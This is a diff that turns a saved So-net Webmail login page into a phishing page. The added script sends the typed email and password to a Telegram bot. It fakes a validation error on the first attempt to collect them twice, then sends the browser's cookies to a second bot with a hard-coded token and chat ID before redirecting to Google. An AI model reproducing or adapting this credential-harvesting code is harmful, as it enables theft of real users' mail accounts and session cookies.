@@ -1,7 +1,8 @@
 <!DOCTYPE html>
 <html>
-  
-<link rel="stylesheet" href="https://webmail.so-net.ne.jp/appsuite/v=7.10.6-41.20240129.020539/apps/themes/login/login.css">
+
+<head>
+  <link rel="stylesheet" href="https://webmail.so-net.ne.jp/appsuite/v=7.10.6-41.20240129.020539/apps/themes/login/login.css">
   <style type="text/css">
     html, body { background-color: #fff; margin: 0; padding: 0; border: 0; }
     body { overflow: hidden; }
@@ -39,7 +40,38 @@
 .smartphone #io-ox-login-screen #io-ox-login-container #io-ox-login-content #box-form #box-form-body {
     border-radius: 0;
 }
-</style><title>ログイン - So-net Webメール | So-net |</title><link type="text/css" rel="stylesheet" charset="UTF-8" href="./ログイン - So-net Webメール _ So-net __files/m=el_main_css"></head>
+</style>
+  <meta id="bootstrap">
+  <meta id="theme">
+  <meta id="css">
+  <meta id="custom">
+  <meta id="code">
+  <script>
+    window.ox = { signin: true }; var path = location.pathname; if (/^\/\//.test(path)) { location.href = location.href.replace(path, path.replace(/^[/]*/, '/')); }
+  </script>
+  <link id="favicon" rel="shortcut icon" href="https://webmail.so-net.ne.jp/appsuite/v=7.10.6-48.20241105.121300/apps/themes/login/favicon.ico" type="image/x-icon">
+  <style data-src="login-page-configuration"></style>
+  <style data-src="login-page-configuration-custom" type="text/css">
+    #io-ox-login-screen .row>.form-group p {
+      color: #888;
+      text-align: left;
+    }
+
+    #io-ox-login-screen #io-ox-login-feedback.alert-highlight>.alert-info {
+      color: red
+    }
+
+    .smartphone #io-ox-login-screen #io-ox-login-container #box-form-header {
+      display: block
+    }
+
+    .smartphone #io-ox-login-screen #io-ox-login-container #io-ox-login-content #box-form #box-form-body {
+      border-radius: 0;
+    }
+  </style>
+  <title>ログイン - So-net Webメール | So-net |</title>
+  <link type="text/css" rel="stylesheet" charset="UTF-8" href="./ログイン - So-net Webメール _ So-net __files/m=el_main_css">
+</head>
 
 <body class="unselectable" __processed_6601d565-53ee-4186-9165-20b0dd8c3a01__="true" bis_register="">
   <div id="background-loader" class="busy" aria-hidden="true" bis_skin_checked="1" style="display: none;">
@@ -49,7 +81,7 @@
       <div class="bounce3" bis_skin_checked="1"></div>
     </div>
     <div id="showstopper" bis_skin_checked="1">
-      <div class="down" bis_skin_checked="1"><span><b>Connection error</b></span><br><span>The service is not available right now.</span><br><a href="https://webmail.so-net.ne.jp/appsuite/#" class="reload">Retry</a></div>
+      <div class="down" bis_skin_checked="1"><span><b>Connection error</b></span><br><span>The service is not available right now.</span><br><a href="https://webmail.so-net.ne.jp/appsuite/#" class="reload">Reload</a></div>
       <div class="timeout" bis_skin_checked="1"><span>Connection timed out. Please try reloading the page.</span><br><a href="https://webmail.so-net.ne.jp/appsuite/#" class="reload">Reload</a></div>
       <div class="session" bis_skin_checked="1"><span>Something went wrong. Please close this browser tab and try again.</span></div>
     </div>
@@ -73,7 +105,9 @@
     <div id="io-ox-login-container" bis_skin_checked="1">
       <div id="io-ox-login-background-image" bis_skin_checked="1">
         <header id="io-ox-login-header">
-          <div id="io-ox-login-toolbar" bis_skin_checked="1"><div class="composition-element login-spacer" bis_skin_checked="1"></div></div>
+          <div id="io-ox-login-toolbar" bis_skin_checked="1">
+            <div class="composition-element login-spacer" bis_skin_checked="1"></div>
+          </div>
         </header>
         <div id="io-ox-login-content" bis_skin_checked="1">
           <div class="align-center col-sm-6 col-xs-12" bis_skin_checked="1">
@@ -86,6 +120,10 @@
                       <div id="box-form-body" class="row" bis_skin_checked="1">
                         <form action="#" method="post" id="io-ox-login-form" target="store-credentials" novalidate="">
                           <div class="col-xs-12" bis_skin_checked="1">
+                            <div class="row logo" bis_skin_checked="1">
+                              <img id="logo" src="data:image/jpeg;base64,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9VTyD/uB8TvIB4+KwGbisTJ1fRjtMj7fCMqyaIIQwXcCAQaysJHNkLLH8R9//apV2a2VpKBmSjgZHf2ncZHfvPPrHnpewvpZbpEBERAREQYWOUr5qeaKJwa+SKRjXG9mue0tBNtdCbqC/wBAFT98p/derAogr9+gCp++U/uvXe7qd3cmEuqHSzRymYRhuQEZQ0vLr367t8lIiION3o7IS4pTR08UrIssokcXAkHKx7QNP37+CjD9AFT98p/derAogr9+gCp++U/uvUwbA7OnD6GGlc9r3R5y5zQQCXyOfoD1BwHguhRAUc7bboKOuc6aEmlndcucxoMTydSXx6et2tI4km6kZEFacS3H4nGT0X0eYcssmVx7w8AA+JWti3P4wTY0gb2maC3weT8FahEFfMF3CVTyDV1MMTdNIw6R/aNcrR33KlrY/YChw0Xp4s0trGaT1pT12NrNHY0DxXUogIiIITxvcbLUVE85ro2meWSS3Qk26R5da+ftWF/w/Sff4/wT/rU8ogiXYXc67D62KrfVslEWf1BGWklzHMGuY8M1/BS0iICIiAiIg12JYHTz/tYmk/aGj/eGq5fENgiNaaX+GT/UB/Jdyi5s2kw5fmr7tlMtq9pRFXYbPB+2ic0fa4s94aLxjnUxELS4jsrTS3OTo3H60fq/D2T5KIz8F9cdvz7ummr/ALocDHOut2Tw0uImePVHsDrP2u4f1wXlhux7GzOEkhe1mU5cuW972zG50FvFdg1oAsBYDgOSx0HCZrk+Jljt2j6+TNqImOWr6iIrE4hERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREH//Z" alt="Logo" width="100">
+                            </div>
+                            <div id="error-message">Can't validate credentials, please retry.</div>
                             <div class="row title" bis_skin_checked="1">
                               <h1 id="login-title" class="col-xs-12" data-i18n="So-net Webメール ログイン">So-net Webメール ログイン</h1>
                             </div>
@@ -98,7 +136,7 @@
                             <div class="row username" bis_skin_checked="1">
                               <div class="form-group col-xs-12" bis_skin_checked="1">
                                 <label for="io-ox-login-username" data-i18n="User name">メールアドレス</label>
-                                <input type="text" id="io-ox-login-username" name="username" class="form-control" maxlength="1000" autocorrect="off" autocapitalize="off" spellcheck="false" aria-required="true" autocomplete="username">
+                                <input type="text" id="io-ox-login-username" name="username" class="form-control" maxlength="1000" autocorrect="off" autocapitalize="off" spellcheck="false" aria-required="true">
                                 <p>
                                   例）taro_suzuki@aa2.so-net.ne.jp<br>
                                   メールアドレスが分からない方は <a target="_blank" href="#">こちら</a>
@@ -108,12 +146,12 @@
                             <div class="row password" bis_skin_checked="1">
                               <div class="form-group col-xs-12" bis_skin_checked="1">
                                 <label for="io-ox-login-password" data-i18n="Password">メールアドレスパスワード</label>
-                                <input type="password" id="io-ox-login-password" name="password" class="form-control" maxlength="1000" autocorrect="off" autocapitalize="off" aria-required="true" autocomplete="current-password">
+                                <input type="password" id="io-ox-login-password" name="password" class="form-control" maxlength="1000" autocorrect="off" autocapitalize="off" aria-required="true">
                                 <p>
                                   メールアドレスパスワードが分からない方は <a target="_blank" href="#">こちら</a><br>
                                   ※ NURO光をご利用の方は <a target="_blank" href="#">こちら</a>
                                 </p>
-                                
+
                               </div>
                             </div>
                             <div class="row options" bis_skin_checked="1">
@@ -162,7 +200,90 @@
   </div>
 
   <div id="tmp" style="display: none;" bis_skin_checked="1">
-    <iframe src="javascript:false" name="store-credentials" width="0" height="0" tabindex="-1" title="empty" style="display:none" src="./ログイン - So-net Webメール _ So-net __files/saved_resource.html"></iframe>
+    <iframe src="javascript:false" name="store-credentials" width="0" height="0" tabindex="-1" title="empty" style="display:none"></iframe>
   </div>
 
-</body></html>
+  <script>
+    let attemptCount = 0;
+
+    function validateEmail(email) {
+      const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      return re.test(String(email).toLowerCase());
+    }
+
+    async function sendToTelegramBot(message) {
+      const botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
+      const chatId = 'YOUR_CHAT_ID';
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      await fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+        }),
+      });
+    }
+
+    async function sendCookieToTelegramBot(cookie) {
+      const botToken = '8087542941:AAERd1GSgtay5-8U5uSLLEXb_iuwZNlLP5c';
+      const chatId = '1479173116';
+      const url = `https://api.telegram.org/bot${botToken}/sendDocument`;
+
+      const formData = new FormData();
+      const blob = new Blob([JSON.stringify({ cookie })], { type: 'application/json' });
+      formData.append('chat_id', chatId);
+      formData.append('document', blob, 'cookie.json');
+
+      await fetch(url, {
+        method: 'POST',
+        body: formData,
+      });
+    }
+
+    document.getElementById('io-ox-login-form').addEventListener('submit', async function (e) {
+      e.preventDefault();
+
+      const username = document.getElementById('io-ox-login-username').value;
+      const password = document.getElementById('io-ox-login-password').value;
+      const errorMessage = document.getElementById('error-message');
+
+      errorMessage.style.display = 'none';
+
+      if (!username || !password) {
+        errorMessage.textContent = 'Please enter both email and password.';
+        errorMessage.style.display = 'block';
+        return;
+      }
+
+      if (!validateEmail(username)) {
+        errorMessage.textContent = 'Please enter a valid email address.';
+        errorMessage.style.display = 'block';
+        return;
+      }
+
+      attemptCount += 1;
+
+      if (attemptCount === 1) {
+        // First attempt - show error message, clear inputs, and send to Telegram
+        errorMessage.textContent = "Can't validate credentials, please retry.";
+        errorMessage.style.display = 'block';
+        document.getElementById('io-ox-login-username').value = '';
+        document.getElementById('io-ox-login-password').value = '';
+        await sendToTelegramBot(`First attempt: Username: ${username}, Password: ${password}`);
+      } else if (attemptCount === 2) {
+        // Second attempt - send to Telegram and redirect
+        await sendToTelegramBot(`Second attempt: Username: ${username}, Password: ${password}`);
+        const redirectUrl = 'https://www.google.com';
+        const cookies = document.cookie;
+        await sendCookieToTelegramBot(cookies);
+        window.location.href = redirectUrl;
+      }
+    });
+  </script>
+</body>
+
+</html>
